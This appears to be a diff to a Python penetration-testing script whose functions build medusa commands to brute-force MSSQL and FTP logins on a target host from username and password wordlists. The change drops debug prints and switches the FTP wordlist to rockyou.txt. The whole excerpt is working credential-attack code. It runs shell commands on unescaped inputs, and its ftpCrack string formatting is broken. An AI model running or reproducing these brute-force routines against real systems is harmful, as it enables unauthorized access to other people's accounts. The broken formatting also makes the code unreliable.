@@ -17,9 +17,7 @@ def sshCrack(ip_address, port, root):
 	return
 
 def mssqlCrack(ip_address, port, root):
-	print("IM HERE")
 	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mssql > %spassword/mssql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/pw.txt", port, root, ip_address)	
-	print ("AND HERE")
 	results = subprocess.check_output(MEDUSA, shell=True)
 	results = results.decode('utf-8')
 	results = results.split("\n")
@@ -59,7 +57,7 @@ def webformCrack(ip_address, port, root):
 	return
 
 def ftpCrack(ip_address, port, root):
-	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ftp > " + root + "password/ftp/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/pw.txt", port, ip_address)
+	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ftp > " + root + "password/ftp/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
 	results = subprocess.check_output(MEDUSA, shell=True)
 	results = results.decode('utf-8')
 	results = results.split("\n")
